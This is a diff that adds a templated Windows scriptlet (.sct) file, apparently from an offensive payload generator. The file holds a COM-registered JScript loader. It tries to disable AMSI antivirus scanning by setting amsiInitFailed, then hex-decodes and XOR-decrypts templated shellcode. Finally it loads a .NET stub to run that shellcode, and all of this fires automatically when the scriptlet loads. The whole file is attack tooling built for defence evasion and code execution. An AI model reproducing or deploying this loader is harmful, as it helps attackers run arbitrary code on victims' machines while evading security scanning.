@@ -1,0 +1,45 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="{{ v.progid }}"
+    classid="{{ '{' }}{{ v.clsid }}{{ '}' }}"
+    description="{{ v.desc }}"
+    remotable="true">
+    <script language="JScript">
+    <![CDATA[
+    function {{ v.fn_amsi }}() {
+        try {
+            var asm  = new ActiveXObject("System.Reflection.Assembly");
+            var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
+            if (amsi !== null) {
+                amsi.GetField("amsiInitFailed", 36).SetValue(null, true);
+            }
+        } catch (e) {}
+    }
+
+    function {{ v.fn_hex }}(h) {
+        var a = []; for (var i = 0; i < h.length; i += 2)
+            a.push(parseInt(h.substr(i, 2), 16));
+        return a;
+    }
+
+    function {{ v.fn_xor }}(d, k) {
+        var o = []; for (var i = 0; i < d.length; i++)
+            o.push(d[i] ^ k[i % k.length]);
+        return o;
+    }
+
+    function {{ v.fn_run }}() {
+        {{ v.fn_amsi }}();
+        var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
+                                {{ v.fn_hex }}("{{ key_hex }}"));
+        var loader = new ActiveXObject("System.Reflection.Assembly");
+        var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
+        asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
+    }
+
+    {{ v.fn_run }}();
+    ]]>
+    </script>
+</registration>
+</scriptlet>
